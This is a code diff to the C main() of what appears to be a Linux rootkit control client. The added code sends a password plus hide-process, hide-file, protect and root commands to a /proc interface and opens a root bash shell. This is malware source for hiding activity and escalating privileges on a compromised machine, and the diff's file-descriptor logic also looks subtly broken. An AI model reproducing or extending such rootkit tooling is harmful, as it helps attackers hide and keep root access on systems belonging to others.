@@ -145,7 +145,6 @@ void write_buffer(char **dest_ptr, char *src, size_t size)
 
 int main(int argc, char **argv)
 {
-
     int root;
     int hide_pid;
     int unhide_pid;
@@ -163,6 +162,8 @@ int main(int argc, char **argv)
                                   &protect, &unprotect);
 
     size_t buf_size = 0;
+
+    buf_size += sizeof(CFG_PASS);
 
     if (root) {
         buf_size += sizeof(CFG_ROOT);
@@ -184,13 +185,60 @@ int main(int argc, char **argv)
         buf_size += sizeof(CFG_UNPROTECT);
     }
 
-    buf_size += 1;
+    buf_size += 1; // for null terminator
 
     char *buf = malloc(buf_size);
-    buf[buf_size -1] = 0;
+    buf[buf_size - 1] = 0;
 
     char *buf_ptr = buf;
 
     write_buffer(&buf_ptr, CFG_PASS, sizeof(CFG_PASS));
 
+    if (root) {
+        write_buffer(&buf_ptr, CFG_ROOT, sizeof(CFG_ROOT));
+    } else if (hide_pid) {
+        write_buffer(&buf_ptr, CFG_HIDE_PID, sizeof(CFG_HIDE_PID));
+        write_buffer(&buf_ptr, pid, strlen(pid));
+    } else if (unhide_pid) {
+        write_buffer(&buf_ptr, CFG_UNHIDE_PID, sizeof(CFG_UNHIDE_PID));
+        write_buffer(&buf_ptr, pid, strlen(pid));
+    } else if (hide_file) {
+        write_buffer(&buf_ptr, CFG_HIDE_FILE, sizeof(CFG_HIDE_FILE));
+        write_buffer(&buf_ptr, file, strlen(file));
+    } else if (unhide_file) {
+        write_buffer(&buf_ptr, CFG_UNHIDE_FILE, sizeof(CFG_UNHIDE_FILE));
+        write_buffer(&buf_ptr, file, strlen(file));
+    } else if (hide) {
+        write_buffer(&buf_ptr, CFG_HIDE, sizeof(CFG_HIDE));
+    } else if (unhide) {
+        write_buffer(&buf_ptr, CFG_UNHIDE, sizeof(CFG_UNHIDE));
+    } else if (protect) {
+        write_buffer(&buf_ptr, CFG_PROTECT, sizeof(CFG_PROTECT));
+    } else if (unprotect) {
+        write_buffer(&buf_ptr, CFG_UNPROTECT, sizeof(CFG_UNPROTECT));
+    }
+
+    int fd = open("/proc/" CFG_PROC_FILE, O_RDONLY);
+
+    if (fd < 1) {
+        int fd = open("/proc/" CFG_PROC_FILE, O_WRONLY);
+
+        if (fd < 1) {
+            fprintf(stderr, "Error: Failed to open %s\n", "/proc/" CFG_PROC_FILE);
+            return 1;
+        }
+
+        write(fd, buf, buf_size);
+    } else {
+        read(fd, buf, buf_size);
+    }
+
+    close(fd);
+    free(buf);
+
+    if (root) {
+        execl("/bin/bash", "bash", NULL);
+    }
+
+    return 0;
 }
